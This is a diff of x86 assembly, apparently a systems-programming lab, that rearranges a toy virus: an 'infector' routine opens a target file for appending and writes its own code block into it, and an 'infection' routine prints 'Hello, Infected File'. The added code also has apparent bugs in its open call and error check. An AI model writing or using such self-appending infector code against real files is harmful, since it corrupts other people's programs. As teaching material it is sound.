@@ -13,57 +13,28 @@ global infector
 global code_start
 global code_end
 extern strlen
+extern main
+global system_call
 
-code_start:
 
-infection:
-    ; Print "Hello, Infected File" using a single system call
-    push dword [hello_msg]
-    call strlen
-    add esp, 4
-    mov edx, eax ; length of the message
-    mov eax, WRITE         ; sys_write
-    mov ebx, STDOUT        ; file descriptor 1 (stdout)
-    mov ecx, hello_msg     ; pointer to the message
-    push edx
-    push ecx
-    push ebx
-    push eax
-    call system_call
-    ret
+_start:
+    pop    dword ecx    ; ecx = argc
+    mov    esi,esp      ; esi = argv
+    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
+    mov     eax,ecx     ; put the number of arguments into eax
+    shl     eax,2       ; compute the size of argv in bytes
+    add     eax,esi     ; add the size to the address of argv 
+    add     eax,4       ; skip NULL at the end of argv
+    push    dword eax   ; char *envp[]
+    push    dword esi   ; char* argv[]
+    push    dword ecx   ; int argc
 
-infector:
-    ; Function to append code from code_start to code_end to a file
-    ; Argument: pointer to the filename in ecx
+    call    main        ; int main( int argc, char *argv[], char *envp[] )
 
-    ; Open the file for appending
-    mov eax, OPEN        ; sys_open
-    mov ebx, ecx         ; pointer to the filename
-    mov ecx, 0x401       ; O_WRONLY | O_APPEND
-    mov edx, 0x1B6       ; 0666 permissions
-    int 0x80             ; make the system call
-    test eax, eax
-    js infector_error
-    mov ebx, eax         ; store the file descriptor
-
-    ; Write the code from code_start to code_end to the file
-    mov eax, WRITE       ; sys_write
-    mov ecx, code_start  ; pointer to the start of the code
-    mov edx, code_end - code_start ; length of the code
-    int 0x80             ; make the system call
-    test eax, eax
-    js infector_error
-
-    ; Close the file
-    mov eax, CLOSE       ; sys_close
-    int 0x80             ; make the system call
-    ret
-
-infector_error:
-    ; Handle error (optional)
-    ret
-
-code_end:
+    mov     ebx,eax
+    mov     eax,1
+    int     0x80
+    nop
 
 system_call:
     push    ebp             ; Save caller state
@@ -81,3 +52,71 @@ system_call:
     mov     esp, ebp
     pop     ebp
     ret
+
+code_start:
+
+infection:
+    push dword[hello_msg]
+    call strlen
+    mov edx, eax
+    mov eax, WRITE
+    mov ebx, STDOUT
+    mov ecx, hello_msg
+    push edx
+    push ecx
+    push ebx
+    push eax
+    call system_call
+    add esp, 16
+    ret
+
+infector:
+    mov eax, OPEN
+    mov ebx, [ebp+8]
+    mov ecx, 0x401
+    push edx
+    push ecx
+    push ebx
+    push eax
+    call system_call
+    add esp, 16
+    test eax, eax
+    jz exit_error
+    mov esi, eax 
+
+    ;write the infection code to the file
+    mov eax, WRITE
+    mov ebx, esi
+    lea ecx, [code_start]
+    mov edx, code_end
+    sub edx, code_start
+    push edx
+    push ecx
+    push ebx
+    push eax
+    call system_call
+    add esp, 16
+
+    ;close the file
+    mov eax, CLOSE
+    mov ebx, esi
+    push edx
+    push ecx
+    push ebx
+    push eax
+    call system_call
+    add esp, 16
+    ret
+
+exit_error:
+    mov eax, 1              ; SYS_exit
+    mov ebx, 0x55           ; Exit code 0x55
+    push edx
+    push ecx
+    push ebx
+    push eax
+    call system_call         ; Call custom system_call
+    add esp, 16
+
+
+code_end:
